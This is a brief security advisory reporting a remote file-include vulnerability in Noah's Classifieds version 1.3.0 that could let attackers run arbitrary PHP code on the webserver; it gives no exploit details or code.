Noah's Classifieds is prone to a remote file-include vulnerability.

An attacker can exploit this issue to execute arbitrary malicious PHP code in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.

Version 1.3.0 is vulnerable; other versions may also be affected.
